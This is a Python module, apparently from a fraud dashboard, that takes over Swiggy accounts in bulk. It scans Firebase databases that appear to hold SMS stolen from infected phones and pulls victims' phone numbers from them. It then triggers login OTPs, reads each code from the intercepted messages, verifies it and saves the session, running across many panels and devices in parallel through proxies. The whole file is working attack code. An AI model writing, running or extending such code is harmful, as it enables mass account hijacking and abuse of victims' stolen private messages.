"""Firebase panel harvest engine.

The bot scans panels from inside a Telegram chat; this is the same machinery
with the chat taken out, so the dashboard can drive it while the bot is busy
(or not running at all). Nothing here imports ``swiggy_bot`` — the panel
parsing, OTP capture and device enumeration are reimplemented against the same
file formats, and the login step calls ``dashboard.login`` so the session
records stay byte-compatible with the farm's.

One scan at a time. Panels are walked in order, devices inside a panel run in a
thread pool, and each device walks its phone list until one login sticks.
"""
from __future__ import annotations

import random
import re
import threading
import time
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from urllib.parse import urlparse

import requests
import urllib3

from . import config, login, storage
from .proxies import ProxyPool

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── tuning ───────────────────────────────────────────────────────────────────
OTP_TIMEOUT      = 90          # seconds to sit on a Firebase SMS node
POLL_MIN         = 0.7
POLL_MAX         = 1.4
MAX_RETRIES      = 1           # re-send after an OTP timeout
MAX_AGE_MINUTES  = 2880        # 48h freshness filter on devices
SCAN_WORKERS     = 64          # parallel HTTP while enumerating a panel
WORKERS          = 10          # parallel phone workers per panel
LOG_LIMIT        = 400
MAX_PHONES_PER_DEVICE = 10

PANELS_FILE   = config.ROOT / "panels.txt"
DISABLED_FILE = config.ROOT / "firebase_disabled.txt"

ROOT_KEYS = ["clients", "devices", "users", "Clients", "Devices",
             "client", "device", "phones", "mobiles"]
ONLINE_STATUS_FIELDS = ("status", "online", "isOnline", "connected", "active")
ONLINE_TRUE_VALUES = {"true", "1", "online", "connected", "active", "yes"}
SMS_POLL_PATHS = [
    "messages/{cid}", "sms/{cid}", "notifications/{cid}",
    "notification/{cid}", "inbox/{cid}", "received/{cid}",
    "sendSms/{cid}", "{cid}",
]
MESSAGE_SUBPATHS = ["messages", "sms", "inbox", "Sms", "SMS", "notifications"]

PHONE_RE = re.compile(r"(?:(?:\+|0{0,2})91[\s.\-]?)?([6-9]\d{9})\b")
PHONE_PATTERNS_WEIGHTED = [
    (re.compile(r"(?:phone|mobile|number|mob|no)[\s:]*(?:\+?91[\s-]?)?([6-9]\d{9})", re.I), 15),
    (re.compile(r"\b(?:\+91|91)?([6-9]\d{9})\b"), 10),
    (re.compile(r"[^0-9]([6-9]\d{9})[^0-9]"), 5),
]
SWIGGY_OTP_PATTERNS = [
    re.compile(r"Use OTP\s+(\d{4,8})\s+to log into your Swiggy account", re.I),
    re.compile(r"Use\s+(\d{4,8})\s+as\s+(?:your\s+)?OTP\s+to\s+log\s+into\s+your\s+Swiggy", re.I),
    re.compile(r"(?:swiggy\s+login\s+otp|login\s+otp).*?\b(\d{4,8})\b", re.I),
    re.compile(r"\b(\d{4,8})\b.*?swiggy\s+login\s+otp", re.I),
    re.compile(r"Use OTP\s+(\d{4,8})", re.I),
    re.compile(r"OTP\s*(?:is|:)?\s*(\d{4,8}).{0,40}swiggy", re.I),
    re.compile(r"swiggy.{0,40}OTP\s*(?:is|:)?\s*(\d{4,8})", re.I),
    re.compile(r"(?:swiggy).*?\b(\d{6})\b", re.I),
]
NON_LOGIN_HINTS = ("delete your account", "delete account", "to delete",
                   "reset your password", "change your password",
                   "update your", "verify your email")

_http = requests.Session()
_http.verify = False
_adapter = requests.adapters.HTTPAdapter(pool_connections=128, pool_maxsize=128, max_retries=0)
_http.mount("https://", _adapter)
_http.mount("http://", _adapter)


def now_iso() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


# ═══ panel files ═════════════════════════════════════════════════════════════
def normalise_panel(raw: str) -> str:
    line = str(raw or "").strip()
    if not line or line.startswith("#"):
        return ""
    if line.startswith("http://"):
        line = "https://" + line[7:]
    if not line.startswith("https://"):
        line = "https://" + line
    if not re.search(r"firebaseio\.com|firebasedatabase\.app", line, re.I):
        return ""
    return line.rstrip("/") + "/"


def load_panels() -> tuple[list[str], int]:
    """Active panels from panels.txt, deduped by host. Returns (panels, dupe_count)."""
    try:
        lines = PANELS_FILE.read_text(encoding="utf-8").splitlines()
    except FileNotFoundError:
        return [], 0
    panels: list[str] = []
    seen: set[str] = set()
    dupes = 0
    for line in lines:
        url = normalise_panel(line)
        if not url:
            continue
        host = (urlparse(url).hostname or "").lower()
        if not host:
            continue
        if host in seen:
            dupes += 1
            continue
        seen.add(host)
        panels.append(url)
    return panels, dupes


def load_disabled() -> set[str]:
    disabled: set[str] = set()
    try:
        for line in DISABLED_FILE.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            host = (urlparse(line).hostname if "://" in line else line).lower()
            if host:
                disabled.add(host)
    except FileNotFoundError:
        pass
    return disabled


def disable_panel(panel: str) -> None:
    """Park a dead panel in firebase_disabled.txt so later scans skip it."""
    host = (urlparse(panel).hostname or panel).lower()
    try:
        if DISABLED_FILE.exists() and host in load_disabled():
            return
        with open(DISABLED_FILE, "a", encoding="utf-8") as handle:
            handle.write(f"{panel.rstrip('/')}/\n")
    except OSError:
        pass


# ═══ firebase helpers ════════════════════════════════════════════════════════
def is_suspicious_phone(digits: str) -> bool:
    if len(digits) != 10 or digits[0] not in "6789":
        return True
    if digits.endswith("000") or digits.endswith("0000"):
        return True
    if len(set(digits)) <= 3:
        return True
    return bool(re.search(r"(\d)\1{4,}", digits))


def clean_phone(raw) -> str | None:
    if not raw:
        return None
    digits = re.sub(r"\D", "", str(raw))
    if digits.startswith("91") and len(digits) == 12:
        digits = digits[2:]
    if digits.startswith("0") and len(digits) == 11:
        digits = digits[1:]
    if len(digits) == 10 and digits[0] in "6789" and not is_suspicious_phone(digits):
        return digits
    return None


def find_phones(obj) -> set[str]:
    found: set[str] = set()
    if isinstance(obj, dict):
        for value in obj.values():
            if isinstance(value, (dict, list)):
                found |= find_phones(value)
            else:
                match = PHONE_RE.search(str(value or ""))
                if match:
                    number = match.group(1)
                    if not is_suspicious_phone(number):
                        found.add(number)
    elif isinstance(obj, list):
        for value in obj:
            found |= find_phones(value)
    return found


def phones_from_messages(msgs, top_n: int = 2) -> list[str]:
    scores: dict[str, int] = {}
    items = msgs.values() if isinstance(msgs, dict) else (msgs if isinstance(msgs, list) else [])
    for msg in items:
        if not isinstance(msg, dict):
            continue
        text = str(msg.get("body") or msg.get("message") or msg.get("text")
                   or msg.get("content") or "")
        for pattern, weight in PHONE_PATTERNS_WEIGHTED:
            for number in pattern.findall(text):
                digits = re.sub(r"\D", "", number)
                if digits.startswith("91") and len(digits) == 12:
                    digits = digits[2:]
                if len(digits) == 10 and digits[0] in "6789" and not is_suspicious_phone(digits):
                    scores[digits] = scores.get(digits, 0) + weight
    if not scores:
        return []
    return sorted(scores, key=lambda key: scores[key], reverse=True)[:top_n]


def is_online(device: dict) -> bool:
    for field in ONLINE_STATUS_FIELDS:
        raw = device.get(field)
        if raw is None:
            continue
        if isinstance(raw, bool):
            return raw
        if isinstance(raw, int):
            return raw == 1
        if str(raw).lower().strip() in ONLINE_TRUE_VALUES:
            return True
    return False


def phone_from_fields(device: dict) -> str | None:
    sims = device.get("sims", [])
    if isinstance(sims, dict):
        sims = list(sims.values())
    if isinstance(sims, list):
        for sim in sims[:2]:
            if isinstance(sim, dict):
                for key in ("phoneNumber", "phone", "number", "mobNo", "mob"):
                    phone = clean_phone(sim.get(key))
                    if phone:
                        return phone
    for key in ("mobNo", "mob", "phoneNumber", "phone", "number", "mobile"):
        phone = clean_phone(device.get(key))
        if phone:
            return phone
    return None


def load_root(panel: str) -> dict | None:
    for key in ROOT_KEYS:
        try:
            response = _http.get(f"{panel}{key}.json", timeout=12)
            if response.status_code != 200:
                continue
            data = response.json()
            if isinstance(data, dict) and data:
                return data
        except Exception:
            continue
    return None


def device_age_minutes(panel: str, cid: str) -> float | None:
    try:
        response = _http.get(f"{panel}messages/{cid}.json?shallow=true", timeout=6)
        if response.status_code != 200:
            return None
        keys = response.json()
        if not isinstance(keys, dict) or not keys:
            return None
        numeric = [int(k) for k in keys if str(k).lstrip("-").isdigit()]
        if not numeric:
            return None
        return (time.time() * 1000 - max(numeric)) / 60000
    except Exception:
        return None


def phones_from_panel(panel: str, cid: str, top_n: int = MAX_PHONES_PER_DEVICE) -> list[str]:
    for sub in MESSAGE_SUBPATHS:
        try:
            response = _http.get(f"{panel}{sub}/{cid}.json", timeout=8)
            if response.status_code == 200:
                data = response.json()
                if isinstance(data, dict) and data:
                    found = phones_from_messages(data, top_n=top_n)
                    if found:
                        return found
        except Exception:
            continue
    return []


def parse_swiggy_otp(text: str) -> str | None:
    if not text:
        return None
    low = text.lower()
    if "swiggy" not in low:
        return None
    for hint in NON_LOGIN_HINTS:
        if hint in low:
            return None
    for pattern in SWIGGY_OTP_PATTERNS:
        match = pattern.search(text)
        if match:
            if "delete" in low:
                return None
            return match.group(1)
    return None


# ═══ panel enumeration ═══════════════════════════════════════════════════════
def enumerate_devices(panel: str, max_age: int = MAX_AGE_MINUTES, log=None) -> list[dict]:
    """Devices with at least one phone number, newest first."""
    root = load_root(panel)
    host = (urlparse(panel).hostname or panel)[:32]
    if not root:
        return []
    all_devices = {cid: dev for cid, dev in root.items() if isinstance(dev, dict)}
    online = {cid: dev for cid, dev in all_devices.items() if is_online(dev)}
    if log:
        log(f"{host}: {len(online)}/{len(all_devices)} online")
    if not online:
        return []

    try:
        response = _http.get(f"{panel}messages.json?shallow=true", timeout=10)
        msg_cids = set((response.json() or {}).keys()) if response.status_code == 200 else set()
    except Exception:
        msg_cids = set()
    candidates = {cid: dev for cid, dev in online.items() if cid in msg_cids} or online

    fresh: dict[str, tuple[dict, float]] = {}
    stale = 0
    lock = threading.Lock()

    def check(cid: str, dev: dict) -> None:
        nonlocal stale
        age = device_age_minutes(panel, cid)
        with lock:
            if age is not None and age <= max_age:
                fresh[cid] = (dev, age)
            else:
                stale += 1

    with ThreadPoolExecutor(max_workers=min(SCAN_WORKERS, len(candidates))) as pool:
        futures = [pool.submit(check, cid, dev) for cid, dev in candidates.items()]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception:
                pass

    if not fresh:
        fresh = {cid: (dev, 0.0) for cid, dev in candidates.items()}
        if log:
            log(f"{host}: no timestamps — using all {len(fresh)} online")
    elif log:
        log(f"{host}: {len(fresh)} fresh (<{max_age // 60}h), {stale} too old")

    devices: list[dict] = []
    result_lock = threading.Lock()

    def collect(item: tuple[str, tuple[dict, float]]) -> None:
        cid, (dev, age) = item
        field_phone = phone_from_fields(dev)
        phones = [field_phone] if field_phone else []
        if not phones:
            phones = phones_from_panel(panel, cid)
        if not phones:
            phones = sorted(find_phones(dev))
        if not phones:
            return
        with result_lock:
            devices.append({"client_id": cid, "phones": phones,
                            "age_min": round(age, 1), "panel": panel})

    with ThreadPoolExecutor(max_workers=min(SCAN_WORKERS, len(fresh))) as pool:
        futures = [pool.submit(collect, item) for item in fresh.items()]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception:
                pass

    devices.sort(key=lambda row: row["age_min"])
    return devices


def probe_panel(raw: str, max_age: int = MAX_AGE_MINUTES) -> dict:
    """Read-only look at one panel — no OTPs sent, nothing written."""
    panel = normalise_panel(raw)
    host = (urlparse(panel).hostname or raw or "?")[:40]
    if not panel:
        return {"ok": False, "host": host, "error": "not a firebase url"}
    started = time.time()
    try:
        devices = enumerate_devices(panel, max_age=max_age)
    except Exception as exc:
        return {"ok": False, "host": host, "error": f"{type(exc).__name__}: {exc}"[:160]}
    phones = sum(len(dev["phones"]) for dev in devices)
    return {
        "ok": bool(devices),
        "host": host,
        "devices": len(devices),
        "phones": phones,
        "age_min": devices[0]["age_min"] if devices else None,
        "ms": int((time.time() - started) * 1000),
        "error": "" if devices else "no online devices with numbers",
    }


# ═══ OTP capture ═════════════════════════════════════════════════════════════
def capture_baseline(panel: str, cid: str) -> set[str]:
    baseline: set[str] = set()
    for template in SMS_POLL_PATHS:
        path = template.format(cid=cid)
        try:
            response = _http.get(f"{panel}{path}.json?shallow=true", timeout=4)
            if response.status_code == 200:
                data = response.json()
                if isinstance(data, dict):
                    baseline.update(f"{path}|{key}" for key in data)
        except Exception:
            pass
    return baseline


def wait_for_otp(panel: str, cid: str, baseline: set[str], after_ms: int,
                 stop: threading.Event, log, timeout: int = OTP_TIMEOUT) -> str | None:
    deadline = time.time() + timeout
    key_int = lambda key: int(key) if str(key).lstrip("-").isdigit() else 0  # noqa: E731

    while time.time() < deadline:
        if stop.is_set():
            return None
        for template in SMS_POLL_PATHS:
            path = template.format(cid=cid)
            try:
                response = _http.get(
                    f'{panel}{path}.json?orderBy="$key"&limitToLast=20', timeout=5)
                if response.status_code != 200:
                    continue
                messages = response.json()
                if not isinstance(messages, dict):
                    continue
                for key in sorted(messages, key=key_int, reverse=True):
                    tag = f"{path}|{key}"
                    if tag in baseline:
                        continue
                    if str(key).isdigit() and len(str(key)) >= 12:
                        if int(key) < after_ms - 15000:
                            baseline.add(tag)
                            continue
                    message = messages[key]
                    if not isinstance(message, dict):
                        baseline.add(tag)
                        continue
                    body = str(message.get("message") or message.get("body")
                               or message.get("text") or "")
                    sender = str(message.get("sender") or message.get("address") or "")
                    if "swiggy" in (sender + body).lower():
                        otp = parse_swiggy_otp(body)
                        if otp:
                            log(f"OTP {otp} captured (sender: {sender or 'unknown'})")
                            return otp
                    baseline.add(tag)
            except Exception:
                pass
        time.sleep(random.uniform(POLL_MIN, POLL_MAX))
    return None


# ═══ engine ══════════════════════════════════════════════════════════════════
class Scanner:
    """Single-scan harvest driver. Safe to call from request threads."""

    def __init__(self, pool: ProxyPool) -> None:
        self.pool = pool
        self._lock = threading.RLock()
        self._stop = threading.Event()
        self._thread: threading.Thread | None = None
        self._log: deque[str] = deque(maxlen=LOG_LIMIT)
        self._state: dict = {
            "running": False,
            "started_at": "",
            "finished_at": "",
            "panels_total": 0,
            "panels_done": 0,
            "panel_current": "",
            "devices": 0,
            "phones": 0,
            "attempts": 0,
            "saved": 0,
            "skipped": 0,
            "otp_timeouts": 0,
            "failed": 0,
            "disabled": 0,
            "last_error": "",
            "workers": WORKERS,
            "max_age_minutes": MAX_AGE_MINUTES,
            "otp_timeout": OTP_TIMEOUT,
        }
        self._saved: set[str] = set()

    # ── read side ────────────────────────────────────────────────────────────
    def state(self) -> dict:
        with self._lock:
            snapshot = dict(self._state)
            snapshot["log"] = list(self._log)
        return snapshot

    def log(self, line: str) -> None:
        stamped = f"{datetime.now().strftime('%H:%M:%S')}  {line}"
        with self._lock:
            self._log.append(stamped[:300])

    # ── control ──────────────────────────────────────────────────────────────
    def start(self, workers: int = WORKERS, max_age: int = MAX_AGE_MINUTES,
              otp_timeout: int = OTP_TIMEOUT, panels: list[str] | None = None) -> dict:
        with self._lock:
            if self._state["running"]:
                return {"ok": False, "error": "a scan is already running"}
            if panels is None:
                panels, dupes = load_panels()
            else:
                panels = [p for p in (normalise_panel(x) for x in panels) if p]
                dupes = 0
            disabled = load_disabled()
            active = [p for p in panels if (urlparse(p).hostname or "").lower() not in disabled]
            dropped = len(panels) - len(active)
            if not active:
                return {"ok": False, "error": "no active panels — panels.txt empty or all disabled"}

            self._stop.clear()
            self._log.clear()
            self._saved = {str(r.get("mobile", "")) for r in storage.list_sessions()}
            self._state.update({
                "running": True,
                "started_at": now_iso(),
                "finished_at": "",
                "panels_total": len(active),
                "panels_done": 0,
                "panel_current": "",
                "devices": 0,
                "phones": 0,
                "attempts": 0,
                "saved": 0,
                "skipped": 0,
                "otp_timeouts": 0,
                "failed": 0,
                "disabled": dropped,
                "last_error": "",
                "workers": max(1, min(int(workers or WORKERS), 64)),
                "max_age_minutes": max(1, int(max_age or MAX_AGE_MINUTES)),
                "otp_timeout": max(10, int(otp_timeout or OTP_TIMEOUT)),
            })
            self._thread = threading.Thread(target=self._run, args=(active,), daemon=True)
            self._thread.start()
        self.log(f"scan started — {len(active)} panels, {dropped} disabled")
        storage.activity("scan", "", f"started: {len(active)} panels")
        return {"ok": True, **self.state()}

    def stop(self) -> dict:
        with self._lock:
            if not self._state["running"]:
                return {"ok": True, "running": False, "note": "nothing running"}
            self._stop.set()
        self.log("stop requested — finishing in-flight requests")
        return {"ok": True, "running": True}

    # ── worker ───────────────────────────────────────────────────────────────
    def _run(self, panels: list[str]) -> None:
        try:
            for index, panel in enumerate(panels, 1):
                if self._stop.is_set():
                    break
                host = (urlparse(panel).hostname or panel)[:32]
                with self._lock:
                    self._state["panel_current"] = host
                self.log(f"[{index}/{len(panels)}] scanning {host}")

                devices = enumerate_devices(panel, self._state["max_age_minutes"], self.log)
                if not devices:
                    if load_root(panel) is None:
                        self.log(f"{host}: dead firebase — parked in firebase_disabled.txt")
                        disable_panel(panel)
                        with self._lock:
                            self._state["disabled"] += 1
                    else:
                        self.log(f"{host}: reachable, no live devices — kept")
                    with self._lock:
                        self._state["panels_done"] = index
                    continue

                phones = sum(len(dev["phones"]) for dev in devices)
                with self._lock:
                    self._state["devices"] += len(devices)
                    self._state["phones"] += phones
                self.log(f"{host}: {len(devices)} devices, {phones} numbers — harvesting")

                workers = self._state["workers"]
                with ThreadPoolExecutor(max_workers=workers) as pool:
                    futures = [pool.submit(self._device, dev) for dev in devices
                               if not self._stop.is_set()]
                    for future in as_completed(futures):
                        try:
                            future.result()
                        except Exception as exc:
                            self.log(f"worker error: {type(exc).__name__}: {exc}"[:200])
                with self._lock:
                    self._state["panels_done"] = index
                self.log(f"{host}: done — {self._state['saved']} saved so far")
        except Exception as exc:
            with self._lock:
                self._state["last_error"] = f"{type(exc).__name__}: {exc}"[:200]
            self.log(f"scan aborted: {self._state['last_error']}")
        finally:
            with self._lock:
                self._state["running"] = False
                self._state["panel_current"] = ""
                self._state["finished_at"] = now_iso()
                saved = self._state["saved"]
            self.log(f"scan finished — {saved} sessions saved")
            storage.activity("scan", "", f"finished: {saved} saved")

    def _device(self, device: dict) -> None:
        for phone in device["phones"]:
            if self._stop.is_set():
                return
            with self._lock:
                if phone in self._saved:
                    self._state["skipped"] += 1
                    continue
            outcome = self._attempt(phone, device["client_id"], device["panel"])
            if outcome == "saved":
                self.log(f"device {device['client_id'][:8]}: {phone} harvested")
                return
        self.log(f"device {device['client_id'][:8]}: all numbers exhausted")

    def _attempt(self, phone: str, cid: str, panel: str) -> str:
        host = (urlparse(panel).hostname or panel)[:32]
        for attempt in range(1, MAX_RETRIES + 2):
            if self._stop.is_set():
                return "stopped"
            baseline = capture_baseline(panel, cid)
            after_ms = int(time.time() * 1000)
            with self._lock:
                self._state["attempts"] += 1
            sent = login.send_otp(phone, self.pool)
            if not sent.get("ok"):
                reason = str(sent.get("error") or "OTP send failed")[:100]
                self.log(f"{phone}: send failed — {reason}")
                with self._lock:
                    self._state["failed"] += 1
                if "403" in reason or "limit" in reason.lower() or "exceeded" in reason.lower():
                    return "failed"
                if attempt > MAX_RETRIES:
                    return "failed"
                time.sleep(1.5)
                continue

            self.log(f"{phone}: OTP sent via {host} — polling firebase")
            otp = wait_for_otp(panel, cid, baseline, after_ms, self._stop, self.log,
                              timeout=self._state["otp_timeout"])
            if not otp:
                with self._lock:
                    self._state["otp_timeouts"] += 1
                    self._state["failed"] += 1
                self.log(f"{phone}: OTP timeout (attempt {attempt})")
                if attempt > MAX_RETRIES:
                    return "timeout"
                continue

            verified = login.verify_otp(str(sent.get("ticket") or ""), otp)
            if not verified.get("ok"):
                self.log(f"{phone}: verify failed — {str(verified.get('error'))[:100]}")
                with self._lock:
                    self._state["failed"] += 1
                return "failed"

            with self._lock:
                self._saved.add(phone)
                self._state["saved"] += 1
            storage.activity("scan", phone, f"harvested from {host}")
            self.log(f"{phone}: session saved")
            return "saved"
        return "failed"
